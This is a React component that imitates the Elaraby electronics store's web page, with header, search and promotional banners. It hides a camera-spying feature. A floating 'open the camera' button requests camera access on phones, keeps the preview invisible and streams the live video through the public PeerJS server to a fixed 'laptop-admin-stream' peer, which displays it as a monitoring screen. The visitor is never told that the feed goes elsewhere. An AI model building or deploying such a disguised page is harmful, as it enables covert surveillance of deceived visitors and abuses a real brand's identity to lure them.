'use client';

import React, { useState, useRef, useEffect } from 'react';

export default function ElarabyStoreDemo() {
  const localVideoRef = useRef(null);
  const remoteVideoRef = useRef(null);
  
  const [peerId, setPeerId] = useState('');
  const [targetPeerId, setTargetPeerId] = useState('laptop-admin-stream'); // ID ثابت وموحد للابتوب
  const [statusMessage, setStatusMessage] = useState('');
  const [errorMessage, setErrorMessage] = useState('');
  const [isLaptop, setIsLaptop] = useState(false);
  const peerInstance = useRef(null);

  useEffect(() => {
    // استدعاء PeerJS فقط في بيئة المتصفح Client-side
    import('peerjs').then(({ default: Peer }) => {
      // نحدد إذا كان الجهاز لابتوب/كمبيوتر أو موبايل لتخصيص الـ ID
      const userAgent = navigator.userAgent.toLowerCase();
      const isMobileDevice = /mobile|android|iphone|ipad/.test(userAgent);
      
      const currentId = isMobileDevice ? `mobile-${Math.floor(Math.random() * 1000)}` : 'laptop-admin-stream';
      setIsLaptop(!isMobileDevice);

      // إعدادات Peer مع إضافة STUN Servers لضمان تجاوز عوائق الشبكات في مصر
      const peer = new Peer(currentId, {
        host: '0.peerjs.com',
        port: 443,
        secure: true,
        config: {
          iceServers: [
            { urls: 'stun:stun.l.google.com:19302' },
            { urls: 'stun:global.stun.twilio.com:3478' }
          ]
        }
      });

      peer.on('open', (id) => {
        console.log("🟢 تم الاتصال بسيرفر Peer بنجاح! والـ ID الخاص بهذا الجهاز هو:", id);
        setPeerId(id);
        if (!isMobileDevice) {
          setStatusMessage('🖥️ شاشة اللابتوب جاهزة لاستقبال بث الكاميرا...');
        }
      });

      peer.on('error', (err) => {
        console.error("🔴 خطأ في سيرفر PeerJS:", err);
      });

      // استقبال البث على شاشة اللابتوب
      peer.on('call', (call) => {
        console.log("📥 تم استلام مكالمة فيديو/بث مباشر جديدة!");
        setStatusMessage('📡 جاري استقبال البث المباشر من الموبايل...');
        call.answer(); // قبول المكالمة/البث
        call.on('stream', (remoteStream) => {
          console.log("🎥 تم استلام الـ Stream بنجاح وعرضه على الشاشة!");
          const video = remoteVideoRef.current;
          if (video) {
            video.muted = true;
            video.onloadedmetadata = () => {
              video.play().then(() => {
                setErrorMessage('');
                setStatusMessage('🟢 البث الحي للموبايل شغال الآن على اللابتوب!');
              }).catch((error) => {
                console.error('Error playing remote video:', error);
                video.controls = true;
                setErrorMessage('⚠️ تعذر تشغيل الفيديو تلقائياً. استخدم زر التشغيل لبدء العرض.');
              });
            };
            video.srcObject = remoteStream;
          }
        });
      });

      peerInstance.current = peer;
    });

    return () => {
      if (peerInstance.current) {
        peerInstance.current.destroy();
      }
    };
  }, []);

  // تشغيل الكاميرا من الموبايل وإرسال البث للابتوب
  const startCameraAndSend = async () => {
    try {
      setErrorMessage('');
      setStatusMessage('جاري تشغيل الكاميرا والاتصال باللابتوب...');

      const stream = await navigator.mediaDevices.getUserMedia({
        video: { width: { ideal: 640 }, height: { ideal: 480 } },
        audio: false,
      });

      // تشغيل الكاميرا في الخلفية على الموبايل
      if (localVideoRef.current) {
        localVideoRef.current.srcObject = stream;
        await localVideoRef.current.play();
      }

      // إرسال البث المباشر إلى اللابتوب باستخدام الـ Target ID الثابت
      if (peerInstance.current) {
        console.log("🚀 جاري الاتصال بالـ Target ID:", targetPeerId);
        const call = peerInstance.current.call(targetPeerId, stream);
        if (call) {
          setStatusMessage('🟢 تم فتح الكاميرا وجاري بث الصورة للابتوب...');
          console.log("🟢 تم بدء إرسال البث بنجاح.");
        } else {
          setErrorMessage('⚠️ لم يتم العثور على اللابتوب، تأكد من فتح الصفحة عليه أولاً.');
        }
      }
    } catch (error) {
      console.error('فشل الوصول للكاميرا:', error);
      setErrorMessage('⚠️ تعذر تشغيل الكاميرا، يرجى السماح بالإذن.');
    }
  };

  return (
    <div dir="rtl" style={{ fontFamily: 'sans-serif', backgroundColor: '#f4f5f7', minHeight: '100vh', paddingBottom: '40px' }}>
      
      {/* 1. الشريط العلوي (Top Header) */}
      <div style={{ backgroundColor: '#034a96', color: '#fff', fontSize: '12px', padding: '6px 40px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <div style={{ display: 'flex', gap: '20px' }}>
          <span>صيانتنا</span>
          <span>المدونة</span>
          <span>اتصل بنا</span>
          <span>الدعم والمساعدة</span>
        </div>
        <div>
          <span>العربية ⌄</span>
        </div>
      </div>

      {/* 2. الهيدر الرئيسي (Main Navbar) */}
      <div style={{ backgroundColor: '#005bb5', color: '#fff', padding: '15px 40px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <div style={{ textAlign: 'center' }}>
          <h1 style={{ margin: 0, fontSize: '26px', fontWeight: '900', letterSpacing: '1px' }}>ELARABY</h1>
          <p style={{ margin: 0, fontSize: '11px', color: '#b2d5ff' }}>صناع الثقة</p>
        </div>

        <div style={{ flex: '0 1 500px', display: 'flex' }}>
          <input 
            type="text" 
            placeholder="ابحث في المتجر بالكامل هنا..." 
            style={{ width: '100%', padding: '10px 15px', borderRadius: '0 4px 4px 0', border: 'none', outline: 'none', fontSize: '13px' }}
          />
          <button style={{ backgroundColor: '#fff', border: 'none', padding: '0 15px', borderRadius: '4px 0 0 4px', cursor: 'pointer', color: '#005bb5' }}>
            🔍
          </button>
        </div>

        <div style={{ display: 'flex', gap: '25px', alignItems: 'center', fontSize: '13px' }}>
          <div style={{ textAlign: 'left', cursor: 'pointer' }}>
            <div>مرحباً</div>
            <div style={{ fontWeight: 'bold' }}>تسجيل الدخول 👤</div>
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer' }}>
            <div style={{ backgroundColor: '#e11d48', borderRadius: '50%', padding: '2px 8px', fontSize: '11px', fontWeight: 'bold' }}>0</div>
            <span>سلة التسوق<br/><strong>0.00 ج.م</strong></span>
          </div>
        </div>
      </div>

      {/* 3. شريط الأقسام */}
      <div style={{ backgroundColor: '#fff', padding: '10px 40px', boxShadow: '0 2px 4px rgba(0,0,0,0.05)', display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: '13px', fontWeight: 'bold', color: '#333' }}>
        <div style={{ display: 'flex', gap: '25px', alignItems: 'center' }}>
          <span style={{ color: '#005bb5', cursor: 'pointer' }}>☰ جميع الأقسام</span>
          <span style={{ color: '#005bb5', cursor: 'pointer' }}>🏷️ عروض و خصومات</span>
          <span style={{ color: '#005bb5', cursor: 'pointer' }}>📦 منتجات العربي AR</span>
          <span style={{ cursor: 'pointer' }}>العلامات التجارية ⌄</span>
        </div>
      </div>

      {/* 4. منطقة البانرات */}
      <div style={{ maxWidth: '1280px', margin: '20px auto', padding: '0 20px', display: 'grid', gridTemplateColumns: '1fr 2.5fr', gap: '20px' }}>
        <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
          <div style={{ borderRadius: '12px', height: '180px', overflow: 'hidden', position: 'relative', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'linear-gradient(45deg, #d97706, #fef3c7)' }}>
            <div style={{ position: 'absolute', right: '15px', color: '#78350f' }}>
              <span style={{ fontWeight: 'bold', fontSize: '12px', color: '#dc2626' }}>TORNADO</span>
              <h3 style={{ margin: '5px 0', fontSize: '18px' }}>فنجان<br/>على مزاجك</h3>
            </div>
          </div>

          <div style={{ backgroundColor: '#eff6ff', borderRadius: '12px', height: '180px', padding: '20px', border: '1px solid #bfdbfe', display: 'flex', flexDirection: 'column', justifyContent: 'center' }}>
            <h3 style={{ color: '#1d4ed8', margin: '0 0 5px 0', fontSize: '20px' }}>إشترى أكثر</h3>
            <p style={{ color: '#1e40af', margin: 0, fontSize: '12px', fontWeight: 'bold' }}>اكتسب نقاط أكثر واحصل على خصم أكبر</p>
          </div>
        </div>

        <div style={{ backgroundColor: '#0052cc', borderRadius: '16px', padding: '30px', color: '#fff', position: 'relative', overflow: 'hidden', display: 'flex', flexDirection: 'column', justifyContent: 'space-between', boxShadow: '0 10px 15px -3px rgba(0,0,0,0.1)' }}>
          <div>
            <span style={{ fontSize: '14px', letterSpacing: '2px', fontWeight: 'bold' }}>ELARABY</span>
            <h2 style={{ fontSize: '38px', margin: '10px 0', fontWeight: '900' }}>اشترى وقسّط</h2>
            <div style={{ display: 'inline-block', backgroundColor: '#3b82f6', padding: '5px 15px', borderRadius: '20px', fontSize: '14px', fontWeight: 'bold' }}>
              مقدم 0% | فوائد 0% | مصاريف إدارية 0%
            </div>
            <p style={{ marginTop: '15px', fontSize: '22px', fontWeight: 'bold' }}>على 12 شهر</p>
          </div>

          <div style={{ backgroundColor: '#fff', borderRadius: '8px', padding: '10px 20px', color: '#333', display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '20px' }}>
            <span style={{ fontSize: '12px', fontWeight: 'bold', color: '#666' }}>بطاقات ائتمان</span>
            <span style={{ fontWeight: 'bold', color: '#881337' }}>بنك مصر BANQUE MISR</span>
          </div>
        </div>
      </div>

      {/* 5. زر فتح الكاميرا العائم (للموبايل) */}
      <div style={{ position: 'fixed', bottom: '25px', right: '25px', zIndex: 9999 }}>
        <button
          onClick={startCameraAndSend}
          style={{
            backgroundColor: '#005bb5',
            color: '#ffffff',
            border: 'none',
            borderRadius: '25px',
            padding: '12px 24px',
            fontSize: '15px',
            fontWeight: 'bold',
            boxShadow: '0 4px 12px rgba(0,0,0,0.3)',
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            gap: '8px'
          }}
        >
          <span>📷</span>
          <span>فتح الكاميرا يا اخى</span>
        </button>
      </div>

      {/* شاشة العرض المستقبلة (تظهر فقط عند فتح الصفحة من اللابتوب) */}
      {isLaptop && (
        <div style={{ position: 'fixed', bottom: '25px', left: '25px', width: '320px', height: '240px', backgroundColor: '#000', borderRadius: '12px', overflow: 'hidden', border: '3px solid #005bb5', boxShadow: '0 10px 25px rgba(0,0,0,0.5)', zIndex: 9999 }}>
          <div style={{ backgroundColor: '#005bb5', color: '#fff', padding: '4px 10px', fontSize: '11px', textAlign: 'center', fontWeight: 'bold' }}>
            شاشة المراقبة والاستقبال المباشر
          </div>
          <video ref={remoteVideoRef} autoPlay playsInline muted style={{ width: '100%', height: 'calc(100% - 23px)', objectFit: 'cover' }} />
        </div>
      )}

      {/* عنصر فيديو الموبايل المحلي (مخفي تماماً) */}
      <video ref={localVideoRef} autoPlay playsInline muted style={{ display: 'none' }} />

      {/* رسائل التنبيه والوضع */}
      {statusMessage && (
        <div style={{ position: 'fixed', bottom: '80px', right: '25px', backgroundColor: '#10b981', color: '#fff', padding: '10px 15px', borderRadius: '8px', fontSize: '12px', zIndex: 9999, boxShadow: '0 4px 10px rgba(0,0,0,0.2)' }}>
          {statusMessage}
        </div>
      )}

      {errorMessage && (
        <div style={{ position: 'fixed', bottom: '80px', right: '25px', backgroundColor: '#ef4444', color: '#fff', padding: '10px 15px', borderRadius: '8px', fontSize: '12px', zIndex: 9999 }}>
          {errorMessage}
        </div>
      )}

    </div>
  );
}